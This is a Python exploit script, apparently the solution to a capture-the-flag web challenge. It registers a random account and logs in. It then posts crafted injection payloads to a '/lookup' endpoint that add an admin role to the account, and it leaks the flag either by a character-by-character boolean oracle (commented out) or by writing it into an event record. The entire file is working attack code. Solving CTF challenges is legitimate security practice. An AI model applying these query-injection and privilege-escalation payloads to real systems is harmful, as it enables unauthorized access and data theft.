#!/usr/bin/env python3

import random
import string
import sys

import requests

BASE_URL = sys.argv[1]
if BASE_URL.endswith("/"):
    BASE_URL = BASE_URL[:-1]

FLAG_CHARSET = string.ascii_lowercase + "}"

def get_cred() -> str:
    return "".join([random.choice(string.ascii_lowercase) for _ in range(8)])

username = get_cred()
password = get_cred()

sess = requests.Session()

print(f"Target: {BASE_URL}")
print(f"Using the credentials {username} / {password}")

r = sess.post(BASE_URL + "/register", data={"username": username, "password": password})
assert(r.status_code == 200)
assert("Successfully registered" in r.text)
print("registered user")

r = sess.post(BASE_URL + "/login", data={"username": username, "password": password}, allow_redirects=True)
assert(r.status_code == 200)
assert("Logged in as" in r.text)
print("logged in")

"""
when making the login request from browser, server sees the cookie correctly
when making the request from here, server doesn't get the cookie
secure issue: https://gitlab.com/pgjones/quart-auth/-/issues/5
"""

query = r"{$a=a return($a.rjust(128,a))} auth:creds:user=" + username + r" [+#role.admin] "
query = query.ljust(128, "/")
r = sess.post(BASE_URL + "/lookup", data={"query": query}, allow_redirects=True)
assert(r.status_code == 200)
assert("sus indicator!" in r.text)
# assert("/admin" in r.text)
print("escalated to admin")

"""
print("starting flag leak")

flag = "dam{"
while not flag.endswith("}"):
    for c in FLAG_CHARSET:
        candidate = flag + c
        query = r"{$a=a return($a.rjust(128,a))} it:dev:str^='" + candidate + "' "
        query = query.ljust(128, "/")
        r = sess.post(BASE_URL + "/lookup", data={"query": query}, allow_redirects=True)
        if "sus indicator!" in r.text:
            flag += c
            print(f"found: {c}\t{flag}")
            break
"""

query = r"{$a=a return($a.rjust(128,a))} it:dev:str^=dam $f=$node.value() {spin | [meta:event=* :summary=$f +#ingest]} "
query = query.ljust(128, "/")
print(query)
r = sess.post(BASE_URL + "/lookup", data={"query": query}, allow_redirects=True)

print("solved!")